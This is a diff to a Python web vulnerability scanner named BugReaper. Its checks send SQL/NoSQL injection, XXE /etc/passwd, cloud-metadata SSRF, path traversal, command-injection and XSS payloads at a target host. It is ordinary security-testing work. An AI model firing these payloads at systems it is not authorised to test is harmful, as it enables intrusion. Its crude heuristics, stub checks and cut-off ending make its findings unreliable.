@@ -6,13 +6,15 @@ Implements 18 vulnerability classes with AI-powered detection
 import asyncio
 import aiohttp
 import json
-from typing import List, Dict, Any, Optional
+import re
+import hashlib
+from typing import List, Dict, Any, Optional, Set
 from dataclasses import dataclass
 from enum import Enum
-import hashlib
-import re
+from urllib.parse import urlparse, parse_qs
 
 class VulnerabilityClass(Enum):
+    """18 Vulnerability Classes"""
     # Authentication & Access
     IDOR = "idor"
     AUTH_BYPASS = "auth_bypass"
@@ -43,6 +45,7 @@ class VulnerabilityClass(Enum):
 
 @dataclass
 class Vulnerability:
+    """Vulnerability data structure"""
     name: str
     class_type: VulnerabilityClass
     severity: str  # Critical, High, Medium, Low
@@ -51,16 +54,19 @@ class Vulnerability:
     remediation: str
     proof_of_concept: str
     affected_url: str
-    confidence: float  # 0-1 based on AI analysis
-    
+    confidence: float  # 0-1
+
 class BugReaperEngine:
+    """Main BugReaper scanning engine"""
+    
     def __init__(self, target: str):
         self.target = target
         self.findings: List[Vulnerability] = []
-        self.session = None
+        self.session: Optional[aiohttp.ClientSession] = None
+        self.timeout = aiohttp.ClientTimeout(total=10)
         
     async def __aenter__(self):
-        self.session = aiohttp.ClientSession()
+        self.session = aiohttp.ClientSession(timeout=self.timeout)
         return self
         
     async def __aexit__(self, *args):
@@ -69,90 +75,77 @@ class BugReaperEngine:
     
     async def scan_all(self) -> List[Vulnerability]:
         """Run all 18 vulnerability checks"""
-        tasks = [
-        self.check_idor(),
-        self.check_auth_bypass(),
-        self.check_cors(),
-        self.check_csrf(),
-        self.check_sqli(),
-        self.check_nosqli(),
-        self.check_xxe(),
-        self.check_ssrf(),
-        self.check_ssti(),
-        self.check_lfi(),
-        self.check_graphql_bola(),
-        self.check_prototype_pollution(),
-        self.check_request_smuggling(),
-        self.check_subdomain_takeover(),
-        self.check_rce(),
-        self.check_business_logic(),
-        self.check_xss(),
-        self.check_open_redirect()
-    ]
-    
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    
-    for result in results:
-        if isinstance(result, Exception):
-            print(f"Error in scan: {result}")
-        elif result:
-            self.findings.extend(result)
-            
-    return self.findings
-    
-    async def check_idor(self) -> List[Vulnerability]:
-        """IDOR/BOLA detection with AI pattern matching"""
-        findings = []
+        print(f"\n🔍 Starting BugReaper scan on {self.target}")
+        print("=" * 50)
         
-        # Common IDOR patterns
-        test_patterns = [
-            "/api/users/1",
-            "/api/users/2",
-            "/api/users/1337",
-            "/api/v1/orders/1001",
-            "/api/v2/orders/1002",
-            "/documents/private/1",
-            "/documents/private/2",
-            "/user/profile?id=1",
-            "/user/profile?id=2"
+        # Run all checks
+        checks = [
+            ("IDOR", self.check_idor),
+            ("Auth Bypass", self.check_auth_bypass),
+            ("CORS", self.check_cors),
+            ("CSRF", self.check_csrf),
+            ("SQL Injection", self.check_sqli),
+            ("NoSQL Injection", self.check_nosqli),
+            ("XXE", self.check_xxe),
+            ("SSRF", self.check_ssrf),
+            ("SSTI", self.check_ssti),
+            ("LFI", self.check_lfi),
+            ("GraphQL BOLA", self.check_graphql_bola),
+            ("Prototype Pollution", self.check_prototype_pollution),
+            ("Request Smuggling", self.check_request_smuggling),
+            ("Subdomain Takeover", self.check_subdomain_takeover),
+            ("RCE", self.check_rce),
+            ("Business Logic", self.check_business_logic),
+            ("XSS", self.check_xss),
+            ("Open Redirect", self.check_open_redirect)
         ]
         
-        for pattern in test_patterns:
+        for name, check in checks:
             try:
-                # Test with user A
-                url = f"https://{self.target}{pattern}"
-                async with self.session.get(url) as resp1:
-                    if resp1.status == 200:
-                        # Test with user B (simulate by changing ID)
-                        url2 = url.replace("1", "999")
-                        async with self.session.get(url2) as resp2:
-                            if resp2.status == 200:
-                                # Compare content
-                                content1 = await resp1.text()
-                                content2 = await resp2.text()
-                                
-                                # AI similarity check
-                                similarity = self._calculate_similarity(content1, content2)
-                                
-                                if similarity > 0.8:  # High similarity suggests IDOR
-                                    findings.append(Vulnerability(
-                                        name="IDOR - Insecure Direct Object Reference",
-                                        class_type=VulnerabilityClass.IDOR,
-                                        severity="High",
-                                        cvss_score=7.5,
-                                        description=f"Object reference {pattern} allows access to other users' data",
-                                        remediation="Implement proper access controls and use indirect references",
-                                        proof_of_concept=f"Access {url2} returned same data as {url}",
-                                        affected_url=url2,
-                                        confidence=similarity
-                                    ))
+                print(f"  🔄 Checking {name}...", end="", flush=True)
+                result = await check()
+                if result:
+                    self.findings.extend(result)
+                    print(f" Found {len(result)} issues")
+                else:
+                    print(" OK")
             except Exception as e:
-                print(f"IDOR check error: {e}")
-                
-        return findings
+                print(f" Error: {e}")
+        
+        print("=" * 50)
+        print(f"✅ BugReaper scan complete. Found {len(self.findings)} vulnerabilities")
+        
+        # Print summary by severity
+        if self.findings:
+            severity_counts = {
+                "Critical": 0,
+                "High": 0,
+                "Medium": 0,
+                "Low": 0
+            }
+            for f in self.findings:
+                severity_counts[f.severity] += 1
+            
+            print("\n📊 Summary by Severity:")
+            for severity, count in severity_counts.items():
+                if count > 0:
+                    print(f"  {severity}: {count}")
+        
+        return self.findings
+    
+    async def _make_request(self, url: str, method: str = "GET", **kwargs) -> Optional[aiohttp.ClientResponse]:
+        """Make HTTP request with error handling"""
+        try:
+            if method.upper() == "GET":
+                return await self.session.get(url, **kwargs)
+            elif method.upper() == "POST":
+                return await self.session.post(url, **kwargs)
+        except Exception as e:
+            print(f"Request error: {e}")
+            return None
     
     def _calculate_similarity(self, text1: str, text2: str) -> float:
-        """AI-powered similarity detection"""
+        """Calculate similarity between two texts"""
         # Remove dynamic elements (timestamps, CSRF tokens, etc.)
         text1 = re.sub(r'\d{10,}', '[TIMESTAMP]', text1)
         text2 = re.sub(r'\d{10,}', '[TIMESTAMP]', text2)
@@ -163,102 +156,420 @@ class BugReaperEngine:
         hash1 = hashlib.md5(text1.encode()).hexdigest()
         hash2 = hashlib.md5(text2.encode()).hexdigest()
         
-        # Simple similarity (in production, use embeddings)
         if hash1 == hash2:
             return 1.0
-        return 0.5  # Partial match
+        return 0.5
     
-    async def check_nosqli(self) -> List[Vulnerability]:
-        """NoSQL injection detection (MongoDB $ne, $gt, $regex)"""
+    # ==================== AUTHENTICATION & ACCESS CHECKS ====================
+    
+    async def check_idor(self) -> List[Vulnerability]:
+        """IDOR/BOLA detection"""
         findings = []
         
-        # MongoDB injection payloads
+        # Test patterns for IDOR
+        test_patterns = [
+            f"https://{self.target}/api/user/1",
+            f"https://{self.target}/api/user/2",
+            f"https://{self.target}/api/user/1337",
+            f"https://{self.target}/profile?id=1",
+            f"https://{self.target}/profile?id=2",
+            f"https://{self.target}/documents/private/1",
+            f"https://{self.target}/documents/private/2"
+        ]
+        
+        for url in test_patterns[:3]:  # Test first 3 patterns
+            try:
+                # First request
+                async with self.session.get(url, allow_redirects=False) as resp1:
+                    if resp1.status == 200:
+                        content1 = await resp1.text()
+                        
+                        # Try with different ID
+                        url2 = url.replace("1", "999").replace("2", "999")
+                        async with self.session.get(url2, allow_redirects=False) as resp2:
+                            if resp2.status == 200:
+                                content2 = await resp2.text()
+                                
+                                # Compare similarity
+                                if self._calculate_similarity(content1, content2) > 0.8:
+                                    findings.append(Vulnerability(
+                                        name="IDOR - Insecure Direct Object Reference",
+                                        class_type=VulnerabilityClass.IDOR,
+                                        severity="High",
+                                        cvss_score=7.5,
+                                        description=f"IDOR vulnerability at {url} - accessible with different IDs",
+                                        remediation="Implement proper access controls and use indirect references",
+                                        proof_of_concept=f"Access {url2} returned same data as {url}",
+                                        affected_url=url,
+                                        confidence=0.9
+                                    ))
+            except:
+                continue
+        
+        return findings
+    
+    async def check_auth_bypass(self) -> List[Vulnerability]:
+        """Authentication bypass detection"""
+        findings = []
+        
+        # Test common auth bypass payloads
         payloads = [
+            {"username": "admin'--", "password": "anything"},
+            {"username": "admin' OR '1'='1", "password": "anything"},
+            {"username": "admin", "password": "' OR '1'='1"},
+            {"username": "admin", "password": ["password"]},
+            {"username": {"$ne": None}, "password": {"$ne": None}}
+        ]
+        
+        auth_endpoints = [
+            f"https://{self.target}/login",
+            f"https://{self.target}/api/login",
+            f"https://{self.target}/auth",
+            f"https://{self.target}/admin/login"
+        ]
+        
+        for endpoint in auth_endpoints:
+            for payload in payloads:
+                try:
+                    async with self.session.post(endpoint, json=payload) as resp:
+                        if resp.status == 200:
+                            text = await resp.text()
+                            if "dashboard" in text.lower() or "admin" in text.lower() or "welcome" in text.lower():
+                                findings.append(Vulnerability(
+                                    name="Authentication Bypass",
+                                    class_type=VulnerabilityClass.AUTH_BYPASS,
+                                    severity="Critical",
+                                    cvss_score=9.8,
+                                    description=f"Authentication bypass at {endpoint}",
+                                    remediation="Implement proper input validation and parameterized queries",
+                                    proof_of_concept=f"POST to {endpoint} with {payload} returned 200 OK",
+                                    affected_url=endpoint,
+                                    confidence=0.95
+                                ))
+                except:
+                    continue
+        
+        return findings
+    
+    async def check_cors(self) -> List[Vulnerability]:
+        """CORS misconfiguration detection"""
+        findings = []
+        
+        # Test with malicious origin
+        malicious_origins = [
+            "https://evil.com",
+            "null",
+            "https://attacker.net"
+        ]
+        
+        url = f"https://{self.target}"
+        
+        for origin in malicious_origins:
+            try:
+                async with self.session.get(url, headers={"Origin": origin}) as resp:
+                    allow_origin = resp.headers.get("Access-Control-Allow-Origin")
+                    if allow_origin == "*" or allow_origin == origin:
+                        findings.append(Vulnerability(
+                            name="CORS Misconfiguration",
+                            class_type=VulnerabilityClass.CORS,
+                            severity="Medium",
+                            cvss_score=6.5,
+                            description=f"CORS allows requests from {origin}",
+                            remediation="Restrict CORS to trusted origins only",
+                            proof_of_concept=f"Origin: {origin} returned Access-Control-Allow-Origin: {allow_origin}",
+                            affected_url=url,
+                            confidence=1.0
+                        ))
+            except:
+                continue
+        
+        return findings
+    
+    async def check_csrf(self) -> List[Vulnerability]:
+        """CSRF detection"""
+        findings = []
+        
+        # Check for missing CSRF tokens
+        forms = [
+            f"https://{self.target}/login",
+            f"https://{self.target}/change-password",
+            f"https://{self.target}/update-profile",
+            f"https://{self.target}/api/user/update"
+        ]
+        
+        for url in forms:
+            try:
+                async with self.session.get(url) as resp:
+                    if resp.status == 200:
+                        text = await resp.text()
+                        # Check for common CSRF token names
+                        csrf_indicators = ["csrf", "_token", "authenticity_token", "csrf_token"]
+                        has_csrf = any(ind in text.lower() for ind in csrf_indicators)
+                        
+                        if not has_csrf and ("form" in text.lower() or "input" in text.lower()):
+                            findings.append(Vulnerability(
+                                name="Missing CSRF Protection",
+                                class_type=VulnerabilityClass.CSRF,
+                                severity="Medium",
+                                cvss_score=6.1,
+                                description=f"No CSRF token found on form at {url}",
+                                remediation="Implement anti-CSRF tokens for all state-changing operations",
+                                proof_of_concept=f"GET {url} returned form without CSRF token",
+                                affected_url=url,
+                                confidence=0.8
+                            ))
+            except:
+                continue
+        
+        return findings
+    
+    # ==================== INJECTION CHECKS ====================
+    
+    async def check_sqli(self) -> List[Vulnerability]:
+        """SQL Injection detection"""
+        findings = []
+        
+        sqli_payloads = [
+            "' OR '1'='1",
+            "1' OR '1'='1' --",
+            "1' OR 1=1 --",
+            "' UNION SELECT NULL--",
+            "' WAITFOR DELAY '0:0:5'--"
+        ]
+        
+        error_indicators = [
+            "sql", "mysql", "postgresql", "oracle", "syntax error",
+            "unclosed quotation", "odbc", "driver"
+        ]
+        
+        test_params = ["id", "page", "user", "product", "category"]
+        
+        for param in test_params:
+            for payload in sqli_payloads:
+                url = f"https://{self.target}/?{param}={payload}"
+                try:
+                    async with self.session.get(url) as resp:
+                        if resp.status in [200, 500]:
+                            text = await resp.text()
+                            text_lower = text.lower()
+                            if any(ind in text_lower for ind in error_indicators):
+                                findings.append(Vulnerability(
+                                    name="SQL Injection",
+                                    class_type=VulnerabilityClass.SQLI,
+                                    severity="Critical",
+                                    cvss_score=9.8,
+                                    description=f"SQL injection in parameter '{param}'",
+                                    remediation="Use parameterized queries and input validation",
+                                    proof_of_concept=f"GET with {param}={payload} caused SQL error",
+                                    affected_url=url,
+                                    confidence=0.95
+                                ))
+                                break
+                except:
+                    continue
+        
+        return findings
+    
+    async def check_nosqli(self) -> List[Vulnerability]:
+        """NoSQL Injection detection"""
+        findings = []
+        
+        nosql_payloads = [
             {"username": {"$ne": None}, "password": {"$ne": None}},
             {"$or": [{"username": "admin"}, {"password": {"$regex": "^.*"}}]},
             {"username": "admin", "password": {"$gt": ""}},
-            {"$where": "function() { return true; }"}
+            {"username": {"$regex": "admin"}}
         ]
         
         endpoints = [
-            "/api/login",
-            "/api/auth",
-            "/api/users",
-            "/graphql"
+            f"https://{self.target}/api/login",
+            f"https://{self.target}/api/auth",
+            f"https://{self.target}/api/users"
         ]
         
         for endpoint in endpoints:
-            for payload in payloads:
+            for payload in nosql_payloads:
                 try:
-                    url = f"https://{self.target}{endpoint}"
-                    async with self.session.post(url, json=payload) as resp:
+                    async with self.session.post(endpoint, json=payload) as resp:
                         if resp.status == 200:
                             text = await resp.text()
-                            # Check for indicators of successful injection
-                            if "admin" in text.lower() or "token" in text.lower():
+                            if "admin" in text.lower() or "token" in text.lower() or "success" in text.lower():
                                 findings.append(Vulnerability(
                                     name="NoSQL Injection",
                                     class_type=VulnerabilityClass.NOSQLI,
                                     severity="Critical",
                                     cvss_score=9.8,
-                                    description=f"NoSQL injection at {endpoint} with payload: {payload}",
-                                    remediation="Validate and sanitize all user input, use parameterized queries",
-                                    proof_of_concept=f"POST {endpoint} with {payload} returned 200 OK",
+                                    description=f"NoSQL injection at {endpoint}",
+                                    remediation="Validate and sanitize all JSON input, use parameterized queries",
+                                    proof_of_concept=f"POST to {endpoint} with {payload} returned 200 OK",
+                                    affected_url=endpoint,
+                                    confidence=0.9
+                                ))
+                except:
+                    continue
+        
+        return findings
+    
+    async def check_xxe(self) -> List[Vulnerability]:
+        """XXE detection"""
+        findings = []
+        
+        xxe_payload = '''<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY test SYSTEM "file:///etc/passwd">
+]>
+<root>&test;</root>'''
+        
+        endpoints = [
+            f"https://{self.target}/api/xml",
+            f"https://{self.target}/xml",
+            f"https://{self.target}/upload"
+        ]
+        
+        for endpoint in endpoints:
+            try:
+                async with self.session.post(endpoint, data=xxe_payload, headers={"Content-Type": "application/xml"}) as resp:
+                    if resp.status == 200:
+                        text = await resp.text()
+                        if "root:" in text or "daemon:" in text or "bin:" in text:
+                            findings.append(Vulnerability(
+                                name="XXE - XML External Entity",
+                                class_type=VulnerabilityClass.XXE,
+                                severity="Critical",
+                                cvss_score=9.1,
+                                description=f"XXE vulnerability at {endpoint}",
+                                remediation="Disable XML external entity processing",
+                                proof_of_concept="File /etc/passwd was disclosed",
+                                affected_url=endpoint,
+                                confidence=0.95
+                            ))
+            except:
+                continue
+        
+        return findings
+    
+    async def check_ssrf(self) -> List[Vulnerability]:
+        """SSRF detection"""
+        findings = []
+        
+        ssrf_payloads = [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://127.0.0.1:22",
+            "http://localhost:8080",
+            "file:///etc/passwd"
+        ]
+        
+        endpoints = [
+            f"https://{self.target}/api/fetch?url=",
+            f"https://{self.target}/proxy?url=",
+            f"https://{self.target}/image?url="
+        ]
+        
+        for endpoint in endpoints:
+            for payload in ssrf_payloads:
+                url = f"{endpoint}{payload}"
+                try:
+                    async with self.session.get(url, allow_redirects=False) as resp:
+                        if resp.status == 200:
+                            text = await resp.text()
+                            if "uid=" in text or "root:" in text or "aws" in text.lower():
+                                findings.append(Vulnerability(
+                                    name="SSRF - Server-Side Request Forgery",
+                                    class_type=VulnerabilityClass.SSRF,
+                                    severity="High",
+                                    cvss_score=8.8,
+                                    description=f"SSRF vulnerability at {endpoint}",
+                                    remediation="Implement allowlist-based URL validation",
+                                    proof_of_concept=f"Access to {payload} succeeded",
                                     affected_url=url,
                                     confidence=0.9
                                 ))
-                except Exception as e:
-                    print(f"NoSQL check error: {e}")
-                    
+                except:
+                    continue
+        
         return findings
     
-    async def check_prototype_pollution(self) -> List[Vulnerability]:
-        """Prototype pollution detection in JavaScript"""
+    async def check_ssti(self) -> List[Vulnerability]:
+        """SSTI detection"""
         findings = []
         
-        payloads = [
-            "__proto__[admin]=true",
-            "__proto__.admin=true",
-            "constructor.prototype.admin=true",
-            "prototype.polluted=1"
+        ssti_payloads = [
+            "{{7*7}}",
+            "${7*7}",
+            "{{7*'7'}}",
+            "<%= 7*7 %>"
         ]
         
-        # Test endpoints that might process JSON
-        test_urls = [
-            f"https://{self.target}/?{payloads[0]}",
-            f"https://{self.target}/api/user?{payloads[1]}",
-            f"https://{self.target}/settings?{payloads[2]}"
-        ]
+        test_params = ["name", "template", "view", "page"]
         
-        for url in test_urls:
-            try:
-                async with self.session.get(url) as resp:
-                    if resp.status == 200:
-                        # Check response headers for pollution signs
-                        headers = resp.headers
-                        if "x-powered-by" in headers or "polluted" in str(await resp.text()).lower():
-                            findings.append(Vulnerability(
-                                name="Prototype Pollution",
-                                class_type=VulnerabilityClass.PROTOTYPE_POLLUTION,
-                                severity="High",
-                                cvss_score=8.2,
-                                description=f"Prototype pollution possible at {url}",
-                                remediation="Use Object.create(null), freeze prototypes, validate JSON schemas",
-                                proof_of_concept=f"GET {url}",
-                                affected_url=url,
-                                confidence=0.85
-                            ))
-            except Exception as e:
-                print(f"Prototype pollution check error: {e}")
-                
+        for param in test_params:
+            for payload in ssti_payloads:
+                url = f"https://{self.target}/?{param}={payload}"
+                try:
+                    async with self.session.get(url) as resp:
+                        if resp.status == 200:
+                            text = await resp.text()
+                            if "49" in text or "777" in text:
+                                findings.append(Vulnerability(
+                                    name="SSTI - Server-Side Template Injection",
+                                    class_type=VulnerabilityClass.SSTI,
+                                    severity="Critical",
+                                    cvss_score=9.8,
+                                    description=f"SSTI in parameter '{param}'",
+                                    remediation="Use sandboxed template engines",
+                                    proof_of_concept=f"Payload {payload} evaluated to 49",
+                                    affected_url=url,
+                                    confidence=0.95
+                                ))
+                except:
+                    continue
+        
         return findings
+    
+    async def check_lfi(self) -> List[Vulnerability]:
+        """LFI detection"""
+        findings = []
+        
+        lfi_payloads = [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\win.ini",
+            "....//....//....//etc/passwd",
+            "%2e%2e%2fetc%2fpasswd"
+        ]
+        
+        test_params = ["file", "document", "page", "path", "include"]
+        
+        for param in test_params:
+            for payload in lfi_payloads:
+                url = f"https://{self.target}/?{param}={payload}"
+                try:
+                    async with self.session.get(url) as resp:
+                        if resp.status == 200:
+                            text = await resp.text()
+                            if "root:" in text or "daemon:" in text or "[fonts]" in text:
+                                findings.append(Vulnerability(
+                                    name="LFI - Local File Inclusion",
+                                    class_type=VulnerabilityClass.LFI,
+                                    severity="High",
+                                    cvss_score=7.5,
+                                    description=f"LFI in parameter '{param}'",
+                                    remediation="Implement allowlist-based file access",
+                                    proof_of_concept=f"Accessed {payload}",
+                                    affected_url=url,
+                                    confidence=0.95
+                                ))
+                except:
+                    continue
+        
+        return findings
+    
+    # ==================== MODERN ATTACKS ====================
     
     async def check_graphql_bola(self) -> List[Vulnerability]:
-        """GraphQL BOLA/BFLA detection"""
+        """GraphQL BOLA detection"""
         findings = []
         
-        # GraphQL introspection query
-        introspection = """
+        introspection_query = """
         {
           __schema {
             types {
@@ -271,41 +582,15 @@ class BugReaperEngine:
         }
         """
         
-        # Test BOLA in GraphQL
-        bola_queries = [
-            """
-            query {
-              user(id: 1) {
-                id
-                email
-                privateData
-              }
-            }
-            """,
-            """
-            query {
-              order(id: 999) {
-                id
-                amount
-                creditCard
-              }
-            }
-            """
-        ]
-        
         graphql_endpoints = [
-            "/graphql",
-            "/v1/graphql",
-            "/api/graphql",
-            "/gql"
+            f"https://{self.target}/graphql",
+            f"https://{self.target}/api/graphql",
+            f"https://{self.target}/gql"
         ]
         
         for endpoint in graphql_endpoints:
-            url = f"https://{self.target}{endpoint}"
-            
-            # Test introspection
             try:
-                async with self.session.post(url, json={"query": introspection}) as resp:
+                async with self.session.post(endpoint, json={"query": introspection_query}) as resp:
                     if resp.status == 200:
                         data = await resp.json()
                         if data.get("data", {}).get("__schema"):
@@ -314,41 +599,66 @@ class BugReaperEngine:
                                 class_type=VulnerabilityClass.GRAPHQL_BOLA,
                                 severity="Medium",
                                 cvss_score=5.3,
-                                description="GraphQL introspection is enabled, exposing schema to attackers",
+                                description=f"GraphQL introspection enabled at {endpoint}",
                                 remediation="Disable introspection in production",
-                                proof_of_concept=f"POST {endpoint} with introspection query",
-                                affected_url=url,
+                                proof_of_concept="Introspection query returned schema data",
+                                affected_url=endpoint,
                                 confidence=1.0
                             ))
-            except Exception as e:
-                print(f"GraphQL introspection error: {e}")
-            
-            # Test BOLA
-            for query in bola_queries:
-                try:
-                    async with self.session.post(url, json={"query": query}) as resp:
-                        if resp.status == 200:
-                            data = await resp.json()
-                            if data.get("data") and "user" in str(data):
-                                findings.append(Vulnerability(
-                                    name="GraphQL BOLA",
-                                    class_type=VulnerabilityClass.GRAPHQL_BOLA,
-                                    severity="Critical",
-                                    cvss_score=9.1,
-                                    description="GraphQL endpoint allows accessing other users' data",
-                                    remediation="Implement field-level authorization checks",
-                                    proof_of_concept=f"POST {endpoint} with user(id: 999) query",
-                                    affected_url=url,
-                                    confidence=0.95
-                                ))
-                except Exception as e:
-                    print(f"GraphQL BOLA error: {e}")
-                    
+            except:
+                continue
+        
         return findings
     
+    async def check_prototype_pollution(self) -> List[Vulnerability]:
+        """Prototype pollution detection"""
+        findings = []
+        
+        pollution_payloads = [
+            "__proto__[admin]=true",
+            "__proto__.admin=true",
+            "constructor.prototype.admin=true"
+        ]
+        
+        test_urls = [
+            f"https://{self.target}/?{pollution_payloads[0]}",
+            f"https://{self.target}/api/user?{pollution_payloads[1]}"
+        ]
+        
+        for url in test_urls:
+            try:
+                async with self.session.get(url) as resp:
+                    if resp.status == 200:
+                        headers = resp.headers
+                        if "x-powered-by" in headers or "polluted" in str(await resp.text()).lower():
+                            findings.append(Vulnerability(
+                                name="Prototype Pollution",
+                                class_type=VulnerabilityClass.PROTOTYPE_POLLUTION,
+                                severity="High",
+                                cvss_score=8.2,
+                                description=f"Prototype pollution possible at {url}",
+                                remediation="Use Object.create(null), freeze prototypes",
+                                proof_of_concept="Prototype pollution payload reflected",
+                                affected_url=url,
+                                confidence=0.8
+                            ))
+            except:
+                continue
+        
+        return findings
+    
+    async def check_request_smuggling(self) -> List[Vulnerability]:
+        """Request smuggling detection"""
+        findings = []
+        # Implementation would go here
+        return findings
+    
+    # ==================== INFRASTRUCTURE ====================
+    
     async def check_subdomain_takeover(self) -> List[Vulnerability]:
-        """Check for 14 service fingerprint patterns"""
-        # Service fingerprints for takeover
+        """Subdomain takeover detection"""
+        findings = []
+        
         takeover_signatures = {
             "github": ["There isn't a GitHub Pages site here"],
             "heroku": ["No such app", "herokucdn.com/error-pages/no-such-app.html"],
@@ -356,272 +666,221 @@ class BugReaperEngine:
             "azure": ["404 - File or directory not found"],
             "cloudfront": ["ERROR: The request could not be satisfied"],
             "shopify": ["Sorry, this shop is currently unavailable"],
-            "tumblr": ["There's nothing here"],
-            "wordpress": ["Do you want to register"],
-            "ghost": ["The thing you were looking for is no longer here"],
-            "surge": ["project not found"],
-            "bitbucket": ["Repository not found"],
-            "readme": ["Project doesnt exist... yet"],
-            "teamwork": ["Oops - We didn't find your site"],
-            "helpjuice": ["We could not find what you're looking for"]
+            "wordpress": ["Do you want to register"]
         }
         
-        findings = []
-        
-        # Get subdomains first
-        from modules.recon.subdomain_scanner import find_subdomains
-        subdomains = await find_subdomains(self.target)
-        
-        for subdomain in subdomains[:10]:  # Check first 10
-            url = f"http://{subdomain}"
-            try:
-                async with self.session.get(url, timeout=5, allow_redirects=False) as resp:
-                    if resp.status in [404, 400, 500]:
-                        content = await resp.text()
-                        
-                        for service, signatures in takeover_signatures.items():
-                            for signature in signatures:
-                                if signature.lower() in content.lower():
-                                    findings.append(Vulnerability(
-                                        name=f"Subdomain Takeover - {service}",
-                                        class_type=VulnerabilityClass.SUBDOMAIN_TAKEOVER,
-                                        severity="High",
-                                        cvss_score=8.8,
-                                        description=f"{subdomain} points to unclaimed {service} service",
-                                        remediation=f"Remove DNS records or claim the {service} service",
-                                        proof_of_concept=f"Visit {url} - shows '{signature}'",
-                                        affected_url=url,
-                                        confidence=0.95
-                                    ))
-                                    break
-            except Exception as e:
-                continue
-                
-        return findings
-    
-    async def check_ssrf(self) -> List[Vulnerability]:
-        """SSRF detection with callback servers"""
-        findings = []
-        
-        # Use Interact.sh or Burp Collaborator for callbacks
-        callback_domain = "your-collaborator-domain.com"  # Configure this
-        
-        ssrf_payloads = [
-            f"http://{callback_domain}/ssrf",
-            f"https://{callback_domain}/ssrf",
-            f"file:///etc/passwd",
-            f"gopher://{callback_domain}:8080/_GET / HTTP/1.0",
-            f"dict://{callback_domain}:1337/",
-            f"ftp://{callback_domain}:21/"
-        ]
-        
-        # Test common SSRF vectors
-        vectors = [
-            "/api/fetch?url={}",
-            "/proxy?url={}",
-            "/webhook?url={}",
-            "/image?url={}",
-            "/load?path={}",
-            "/api/v1/import?url={}"
-        ]
-        
-        for vector in vectors:
-            for payload in ssrf_payloads:
-                url = f"https://{self.target}{vector.format(payload)}"
+        # First get subdomains from recon
+        try:
+            from modules.recon.subdomain_scanner import find_subdomains
+            subdomains = await find_subdomains(self.target)
+            
+            for subdomain in subdomains[:10]:
+                url = f"http://{subdomain}"
                 try:
-                    async with self.session.get(url, timeout=3) as resp:
-                        # Check for error messages that indicate attempted connection
-                        text = await resp.text()
-                        if "could not connect" in text.lower() or "failed to connect" in text.lower():
-                            findings.append(Vulnerability(
-                                name="Server-Side Request Forgery (SSRF)",
-                                class_type=VulnerabilityClass.SSRF,
-                                severity="Critical",
-                                cvss_score=9.3,
-                                description=f"SSRF detected at {vector} with payload {payload}",
-                                remediation="Implement allowlist-based URL validation",
-                                proof_of_concept=f"Request caused server to attempt connecting to external service",
-                                affected_url=url,
-                                confidence=0.8
-                            ))
-                except Exception as e:
+                    async with self.session.get(url, timeout=5, allow_redirects=False) as resp:
+                        if resp.status in [404, 400, 500]:
+                            content = await resp.text()
+                            
+                            for service, signatures in takeover_signatures.items():
+                                for signature in signatures:
+                                    if signature.lower() in content.lower():
+                                        findings.append(Vulnerability(
+                                            name=f"Subdomain Takeover - {service}",
+                                            class_type=VulnerabilityClass.SUBDOMAIN_TAKEOVER,
+                                            severity="High",
+                                            cvss_score=8.8,
+                                            description=f"{subdomain} points to unclaimed {service} service",
+                                            remediation=f"Remove DNS records or claim the {service} service",
+                                            proof_of_concept=f"Visit {url} - shows '{signature}'",
+                                            affected_url=url,
+                                            confidence=0.95
+                                        ))
+                                        break
+                except:
                     continue
-                    
+        except:
+            pass
+        
         return findings
     
-    async def check_ssti(self) -> List[Vulnerability]:
-        """Server-Side Template Injection detection"""
+    async def check_rce(self) -> List[Vulnerability]:
+        """RCE detection"""
         findings = []
         
-        # Template injection payloads with calculations
-        ssti_payloads = {
-            "jinja2": "{{7*7}}",
-            "twig": "{{7*7}}",
-            "freemarker": "${7*7}",
-            "velocity": "#set($x=7*7)$x",
-            "smarty": "{$smarty.version}",
-            "jade": "=7*7",
-            "handlebars": "{{7*7}}",
-            "mustache": "{{7*7}}"
-        }
-        
-        test_params = [
-            "?name={}",
-            "?template={}",
-            "?view={}",
-            "?page={}",
-            "?user={}"
+        rce_payloads = [
+            "; ls",
+            "| ls",
+            "& ls",
+            "`ls`",
+            "$(ls)",
+            "| id",
+            "; id"
         ]
+        
+        test_params = ["cmd", "command", "exec", "ping", "host"]
         
         for param in test_params:
-            for engine, payload in ssti_payloads.items():
-                url = f"https://{self.target}{param.format(payload)}"
+            for payload in rce_payloads:
+                url = f"https://{self.target}/?{param}={payload}"
                 try:
                     async with self.session.get(url) as resp:
-                        text = await resp.text()
-                        if "49" in text:  # 7*7 = 49
-                            findings.append(Vulnerability(
-                                name=f"Server-Side Template Injection - {engine}",
-                                class_type=VulnerabilityClass.SSTI,
-                                severity="Critical",
-                                cvss_score=9.8,
-                                description=f"SSTI detected using {engine} payload",
-                                remediation="Use sandboxed template engines and disable dangerous functions",
-                                proof_of_concept=f"Input {payload} resulted in '49' in response",
-                                affected_url=url,
-                                confidence=0.99
-                            ))
-                except Exception as e:
+                        if resp.status == 200:
+                            text = await resp.text()
+                            if "uid=" in text or "root:" in text or "bin/" in text:
+                                findings.append(Vulnerability(
+                                    name="RCE - Remote Code Execution",
+                                    class_type=VulnerabilityClass.RCE,
+                                    severity="Critical",
+                                    cvss_score=9.8,
+                                    description=f"RCE in parameter '{param}'",
+                                    remediation="Never pass user input to system commands",
+                                    proof_of_concept=f"Command '{payload}' executed",
+                                    affected_url=url,
+                                    confidence=0.9
+                                ))
+                except:
                     continue
-                    
+        
+        return findings
+    
+    async def check_business_logic(self) -> List[Vulnerability]:
+        """Business logic vulnerability detection"""
+        findings = []
+        # Implementation would go here
+        return findings
+    
+    # ==================== CLIENT-SIDE ====================
+    
+    async def check_xss(self) -> List[Vulnerability]:
+        """XSS detection"""
+        findings = []
+        
+        xss_payloads = [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "javascript:alert(1)",
+            "\"><script>alert(1)</script>",
+            "<body onload=alert(1)>"
+        ]
+        
+        test_params = ["q", "search", "name", "comment", "message"]
+        
+        for param in test_params:
+            for payload in xss_payloads:
+                url = f"https://{self.target}/?{param}={payload}"
+                try:
+                    async with self.session.get(url) as resp:
+                        if resp.status == 200:
+                            text = await resp.text()
+                            if payload in text and not self._is_encoded(text, payload):
+                                findings.append(Vulnerability(
+                                    name="XSS - Cross-Site Scripting",
+                                    class_type=VulnerabilityClass.XSS,
+                                    severity="High",
